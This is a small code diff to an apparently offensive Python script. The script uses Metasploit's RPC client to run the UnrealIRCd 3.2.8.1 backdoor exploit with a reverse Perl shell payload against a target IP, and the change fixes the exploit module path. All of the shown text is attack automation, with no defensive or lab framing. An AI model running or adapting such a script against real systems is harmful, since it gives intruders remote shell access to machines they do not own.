@@ -20,7 +20,7 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'use exploit/unix/irc/unreal_ircd_3281_backdoor')
+    exploit = client.modules.use('exploit', 'exploit/unix/irc/unreal_ircd_3281_backdoor')
     payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
 
     exploit['RHOSTS'] = target_ip
